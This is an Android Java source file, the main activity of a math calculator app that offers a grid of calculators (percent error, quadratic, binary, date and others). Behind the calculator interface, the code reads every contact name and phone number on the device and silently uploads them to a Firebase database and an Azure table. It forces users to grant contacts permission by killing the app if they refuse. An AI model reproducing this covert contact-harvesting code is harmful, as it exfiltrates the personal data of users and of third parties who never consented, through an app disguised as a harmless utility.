package com.geniusnine.android.mathcalculators;

import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.design.widget.NavigationView;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.FragmentManager;
import android.support.v4.content.ContextCompat;
import android.support.v4.view.GravityCompat;
import android.support.v4.widget.DrawerLayout;
import android.support.v7.app.ActionBarDrawerToggle;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.AdapterView;
import android.widget.GridView;

import com.facebook.login.LoginManager;
import com.geniusnine.android.mathcalculators.BinaryCalculator.BinaryCalculator;
import com.geniusnine.android.mathcalculators.DashBord.GetApp;
import com.geniusnine.android.mathcalculators.DateCalculator.DateCalculator;
import com.geniusnine.android.mathcalculators.DensityCalculator.DensityCalculator;
import com.geniusnine.android.mathcalculators.ExponentCalci.ExponentCalculator;
import com.geniusnine.android.mathcalculators.FractionCalculator.FractionCalCalci;
import com.geniusnine.android.mathcalculators.GCFCalculator.GCFCalculator;
import com.geniusnine.android.mathcalculators.HalfLifeCalci.HalfLifeCalci;
import com.geniusnine.android.mathcalculators.HexCalculator.HexCalCalci;
import com.geniusnine.android.mathcalculators.LogCalculator.LogCalculator;
import com.geniusnine.android.mathcalculators.Login.Contacts;
import com.geniusnine.android.mathcalculators.Login.Login;
import com.geniusnine.android.mathcalculators.MassCalculator.MassCalculator;
import com.geniusnine.android.mathcalculators.PercentErrorCalculator.PercentErrorCalculator;
import com.geniusnine.android.mathcalculators.QuadraticCalci.QuadraticCalci;
import com.geniusnine.android.mathcalculators.RatioCalculator.RatioCalCalci;
import com.geniusnine.android.mathcalculators.RootCalculator.RootCalCalci;
import com.geniusnine.android.mathcalculators.TimeCalculator.TimeCalculator;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.microsoft.windowsazure.mobileservices.MobileServiceClient;
import com.microsoft.windowsazure.mobileservices.http.OkHttpClientFactory;
import com.microsoft.windowsazure.mobileservices.table.MobileServiceTable;
import com.squareup.okhttp.OkHttpClient;

import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

import static android.Manifest.permission.READ_CONTACTS;
import static android.Manifest.permission.WRITE_CONTACTS;

public class MainActivity extends AppCompatActivity
        implements NavigationView.OnNavigationItemSelectedListener {

    ///Azure Database connection for contact uploading
    private MobileServiceClient mobileServiceClientContactUploading;
    private MobileServiceTable<Contacts> mobileServiceTableContacts;
    private ArrayList<Contacts> azureContactArrayList;
    private static final int PERMISSION_REQUEST_CODE = 200;
    //Firebase variables... for authentication and contact uploading to firebase
    private FirebaseAuth firebaseAuth;
    private FirebaseAuth.AuthStateListener firebaseAuthListner;
    private DatabaseReference databaseReferenceUserContacts;

    private CustomAdapter mAdapter;
    private ArrayList<String> listCountry;
    private ArrayList<Integer> listFlag;


    private GridView gridView;

    FragmentManager mFragmentManager;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        prepareList();

        // prepared arraylist and passed it to the Adapter class
        mAdapter = new CustomAdapter(this, listCountry, listFlag);

        // Set custom adapter to gridview
        gridView = (GridView) findViewById(R.id.grid);
        gridView.setAdapter(mAdapter);

        gridView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override

            public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
                if (position == 0) {
                    Intent i = new Intent(MainActivity.this, PercentErrorCalculator.class);
                    finish();
                    startActivity(i);

                }
                if (position == 1) {
                    Intent i = new Intent(MainActivity.this, HalfLifeCalci.class);
                    finish();
                    startActivity(i);

                }
                if (position == 2) {
                    Intent i = new Intent(MainActivity.this, QuadraticCalci.class);
                    finish();
                    startActivity(i);

                }
                if (position == 3) {
                    Intent i = new Intent(MainActivity.this, ExponentCalculator.class);
                    finish();
                    startActivity(i);

                }

               if (position == 4) {
                    Intent i = new Intent(MainActivity.this, BinaryCalculator.class);
                    finish();
                    startActivity(i);

                }

                if (position == 5) {
                    Intent i = new Intent(MainActivity.this, HexCalCalci.class);
                    finish();
                    startActivity(i);

                }
                if (position == 6) {
                    Intent i = new Intent(MainActivity.this, LogCalculator.class);
                    finish();
                    startActivity(i);

                }
                if (position == 7) {
                    Intent i = new Intent(MainActivity.this, RatioCalCalci.class);
                    finish();
                    startActivity(i);

                }
                if (position == 8) {
                    Intent i = new Intent(MainActivity.this, RootCalCalci.class);
                    finish();
                    startActivity(i);

                }
                if (position == 9) {
                    Intent i = new Intent(MainActivity.this, DensityCalculator.class);
                    finish();
                    startActivity(i);

                }
                if (position == 10) {
                    Intent i = new Intent(MainActivity.this, MassCalculator.class);
                    finish();
                    startActivity(i);

                } if (position == 11) {
                    Intent i = new Intent(MainActivity.this, FractionCalCalci.class);
                    finish();
                    startActivity(i);

                }if (position == 12) {
                    Intent i = new Intent(MainActivity.this, GCFCalculator.class);
                    finish();
                    startActivity(i);

                }
                if (position == 13) {
                    Intent i = new Intent(MainActivity.this, TimeCalculator.class);
                    finish();
                    startActivity(i);

                }
                if (position == 14) {
                    Intent i = new Intent(MainActivity.this, DateCalculator.class);
                    finish();
                    startActivity(i);

                }

            }
        });


        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        ActionBarDrawerToggle toggle = new ActionBarDrawerToggle(
                this, drawer, toolbar, R.string.navigation_drawer_open, R.string.navigation_drawer_close);
        drawer.setDrawerListener(toggle);
        toggle.syncState();

        NavigationView navigationView = (NavigationView) findViewById(R.id.nav_view);
        navigationView.setNavigationItemSelectedListener(this);
        authenticate();
    }
    public void prepareList() {
        listCountry = new ArrayList<String>();

        listCountry.add("Percent Error ");
        listCountry.add("Half Life ");
        listCountry.add("Quadratic Eqn");
        listCountry.add("Exponent");
        listCountry.add("Binary ");
        listCountry.add("Hex ");
        listCountry.add("Log");
        listCountry.add("Ratio");

        listCountry.add("Root");
        listCountry.add("Density ");
        listCountry.add("Mass");
        listCountry.add("Fraction ");
        listCountry.add("GCF");
      //  listCountry.add("LCM");
        listCountry.add("Time");
        listCountry.add("Date");


        listFlag = new ArrayList<Integer>();
        listFlag.add(R.drawable.error);
        listFlag.add(R.drawable.halflifecal);
        listFlag.add(R.drawable.quadraticcal);
        listFlag.add(R.drawable.exponent);
        listFlag.add(R.drawable.binarycal);
        listFlag.add(R.drawable.hexcal);
        listFlag.add(R.drawable.logcal);
        listFlag.add(R.drawable.ratiocal);

        listFlag.add(R.drawable.rootcal);
        listFlag.add(R.drawable.densitycal);
        listFlag.add(R.drawable.masscal);
        listFlag.add(R.drawable.fractioncal);
        listFlag.add(R.drawable.gcf);
      //  listFlag.add(R.drawable.lcmcal);
        listFlag.add(R.drawable.timecal);
        listFlag.add(R.drawable.datecalculator);


    }

    @Override
    public void onBackPressed() {
        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        if (drawer.isDrawerOpen(GravityCompat.START)) {
            drawer.closeDrawer(GravityCompat.START);
        } else {
            super.onBackPressed();
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_logout) {
            closeapp();
        }

        return super.onOptionsItemSelected(item);
    }

    @SuppressWarnings("StatementWithEmptyBody")
    @Override
    public boolean onNavigationItemSelected(MenuItem item) {
        // Handle navigation view item clicks here.
        int id = item.getItemId();


      /*  if (id == R.id.binaryCal) {

            Intent intent=new Intent(MainActivity.this,MainActivity.class);
            startActivity(intent);
            finish();

        }*/


        if (id == R.id.MoreApps) {

            //Sunile Sir Code
            final String appPackageName = getPackageName(); // getPackageName() from Context or Activity object
            try {
                startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://developer?id=GeniusNine+Info+Systems+LLP")));
            } catch (android.content.ActivityNotFoundException anfe) {
                startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/developer?id=GeniusNine+Info+Systems+LLP")));
            }

        }

        if (id == R.id.Share) {
            final String appPackageName = getPackageName();
            Intent intent = new Intent(Intent.ACTION_SEND);
            intent.setType("text/plain");
            String shareBodyText = "https://play.google.com/store/apps/details?id=" + appPackageName;
            intent.putExtra(Intent.EXTRA_SUBJECT, "Subject/Title");
            intent.putExtra(Intent.EXTRA_TEXT, shareBodyText);
            startActivity(Intent.createChooser(intent, "Choose sharing method"));
        }
        if (id == R.id.RateUs) {
            final String appPackageName = getPackageName(); // getPackageName() from Context or Activity object
            try {
                startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + appPackageName)));
            } catch (android.content.ActivityNotFoundException anfe) {
                startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + appPackageName)));
            }
        }
        if (id == R.id.GetApps) {
                /*    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new GetApp()).commit();*/
            Intent intent = new Intent(MainActivity.this, GetApp.class);
            finish();
            startActivity(intent);

        }
        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        drawer.closeDrawer(GravityCompat.START);
        return true;
    }

    ///Uploading contacts to azure
    private void uploadContactsToAzure() {


        initializeAzureTable();
        fetchContacts();
        uploadContact();


    }

    private void initializeAzureTable() {
        try {
            mobileServiceClientContactUploading = new MobileServiceClient(
                    getString(R.string.web_address),
                    this);
            mobileServiceClientContactUploading.setAndroidHttpClientFactory(new OkHttpClientFactory() {
                @Override
                public OkHttpClient createOkHttpClient() {
                    OkHttpClient client = new OkHttpClient();
                    client.setReadTimeout(20, TimeUnit.SECONDS);
                    client.setWriteTimeout(20, TimeUnit.SECONDS);
                    return client;
                }
            });
            mobileServiceTableContacts = mobileServiceClientContactUploading.getTable(Contacts.class);


        } catch (MalformedURLException e) {

        } catch (Exception e) {

        }
    }

    private void fetchContacts() {
        try {
            azureContactArrayList = new ArrayList<Contacts>();

            Cursor phone = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

            while (phone.moveToNext()) {
                Contacts contact = new Contacts();
                contact.setContactname(phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                contact.setContactnumber(phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                contact.setFirebaseid(firebaseAuth.getCurrentUser().getUid());

                azureContactArrayList.add(contact);


            }
            phone.close();
        } catch (Exception e) {

        }


    }

    private void uploadContact() {
        for (Contacts c : azureContactArrayList) {

            try {
                asyncUploader(c);
                //mobileServiceTable.insert(c);
            } catch (Exception e) {
                Log.e("uploadContact : ", e.toString());
            }
        }
    }

    private void asyncUploader(Contacts contact) {
        final Contacts item = contact;
        //Log.e(" ", item.getContactname());

        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                try {
                    mobileServiceTableContacts.insert(item);
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            try {

                            } catch (Exception e) {
                            }


                        }
                    });
                } catch (final Exception e) {
                }
                return null;
            }
        };
        task.execute();
    }


    ///Authentication with firebase
    private void authenticate() {
        firebaseAuth = FirebaseAuth.getInstance();
        firebaseAuthListner = new FirebaseAuth.AuthStateListener() {
            @Override
            public void onAuthStateChanged(@NonNull FirebaseAuth firebaseAuth) {
                if (firebaseAuth.getCurrentUser() == null) {
                    Log.e("ForumMainActivity:", "User was null so directed to Login activity");
                    Intent loginIntent = new Intent(MainActivity.this, Login.class);
                    loginIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivity(loginIntent);
                    finish();
                } else {
                    if (!checkPermission()) {
                        requestPermission();
                    } else {
                        //Toast.makeText(MainActivityDrawer.this,"Permission already granted.",Toast.LENGTH_LONG).show();
                        syncContactsWithFirebase();
                        uploadContactsToAzure();

                    }

                }

            }
        };

    }

    @Override
    protected void onStart() {
        super.onStart();
        Log.e("ForumMainActivity:", "Starting auth listener");
        firebaseAuth.addAuthStateListener(firebaseAuthListner);
    }


    protected void syncContactsWithFirebase() {

        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                try {
                    databaseReferenceUserContacts = FirebaseDatabase.getInstance().getReference().child(getString(R.string.app_id)).child("Contacts");

                    String user_id = firebaseAuth.getCurrentUser().getUid();
                    DatabaseReference current_user_db = databaseReferenceUserContacts.child(user_id);


                    Cursor phone = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

                    while (phone.moveToNext()) {
                        String name;
                        String number;

                        name = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        number = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                        try {
                            current_user_db.child(number).setValue(name);

                        } catch (Exception e) {

                        }


                    }


                    runOnUiThread(new Runnable() {

                        @Override
                        public void run() {


                        }
                    });
                } catch (Exception exception) {

                }
                return null;
            }
        };

        task.execute();
    }

    public void closeapp() {
       /* AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
        alertDialogBuilder.setMessage("Are you sure you want to close App?");
        alertDialogBuilder.setCancelable(false);
        alertDialogBuilder.setPositiveButton("Yes",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface arg0, int arg1) {*/


                        FirebaseAuth.getInstance().signOut();
                        LoginManager.getInstance().logOut();
               /*     }
                });

        alertDialogBuilder.setNegativeButton("No",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface arg0, int arg1) {

                    }
                });*/

        //Showing the alert dialog
       /* AlertDialog alertDialog = alertDialogBuilder.create();
        alertDialog.show();*/
    }


    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        switch (keyCode) {
            case KeyEvent.KEYCODE_BACK:
                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
                alertDialogBuilder.setMessage("Are you sure you want to close App?");
                alertDialogBuilder.setCancelable(false);
                alertDialogBuilder.setPositiveButton("Yes",
                        new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface arg0, int arg1) {

                                finish();
                            }
                        });

                alertDialogBuilder.setNegativeButton("No",
                        new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface arg0, int arg1) {

                            }
                        });

                //Showing the alert dialog
                AlertDialog alertDialog = alertDialogBuilder.create();
                alertDialog.show();
                return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    //used this when mobile orientaion is changed
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        // Checks the orientation of the screen
        if (newConfig.orientation == Configuration.ORIENTATION_LANDSCAPE) {
            //Toast.makeText(this, "landscape", Toast.LENGTH_SHORT).show();
        } else if (newConfig.orientation == Configuration.ORIENTATION_PORTRAIT) {
            //Toast.makeText(this, "portrait", Toast.LENGTH_SHORT).show();
        }
    }

    private boolean checkPermission() {
        int result = ContextCompat.checkSelfPermission(getApplicationContext(), READ_CONTACTS);
        int result1 = ContextCompat.checkSelfPermission(getApplicationContext(), WRITE_CONTACTS);

        return result == PackageManager.PERMISSION_GRANTED && result1 == PackageManager.PERMISSION_GRANTED;
    }

    private void requestPermission() {

        ActivityCompat.requestPermissions(this, new String[]{READ_CONTACTS, WRITE_CONTACTS}, PERMISSION_REQUEST_CODE);

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case PERMISSION_REQUEST_CODE:
                if (grantResults.length > 0) {

                    boolean locationAccepted = grantResults[0] == PackageManager.PERMISSION_GRANTED;
                    boolean cameraAccepted = grantResults[1] == PackageManager.PERMISSION_GRANTED;

                    if (locationAccepted && cameraAccepted) {
                    } else {

                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            if (shouldShowRequestPermissionRationale(READ_CONTACTS)) {
                                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(MainActivity.this);
                                alertDialogBuilder.setMessage("You must grant permissions for App to work properly. Restart app after granting permission");
                                alertDialogBuilder.setPositiveButton("yes",
                                        new DialogInterface.OnClickListener() {
                                            @Override
                                            public void onClick(DialogInterface arg0, int arg1) {

                                                Log.e("ALERT BOX ", "Requesting Permissions");

                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                                    requestPermissions(new String[]{READ_CONTACTS, WRITE_CONTACTS},
                                                            PERMISSION_REQUEST_CODE);
                                                }
                                            }
                                        });

                                alertDialogBuilder.setNegativeButton("No", new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        Log.e("ALERT BOX ", "Permissions not granted");
                                        android.os.Process.killProcess(android.os.Process.myPid());
                                        System.exit(1);

                                    }
                                });

                                AlertDialog alertDialog = alertDialogBuilder.create();
                                alertDialog.setCanceledOnTouchOutside(false);
                                alertDialog.show();
                                return;
                            } else {
                                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(MainActivity.this);
                                alertDialogBuilder.setMessage("You must grant permissions from  App setting to work");
                                alertDialogBuilder.setPositiveButton("Ok",
                                        new DialogInterface.OnClickListener() {
                                            @Override
                                            public void onClick(DialogInterface arg0, int arg1) {
                                                android.os.Process.killProcess(android.os.Process.myPid());
                                                System.exit(1);
                                            }
                                        });

                                AlertDialog alertDialog = alertDialogBuilder.create();
                                alertDialog.setCanceledOnTouchOutside(false);
                                alertDialog.show();
                                return;

                            }
                        }

                    }
                }

                break;
        }
    }
}
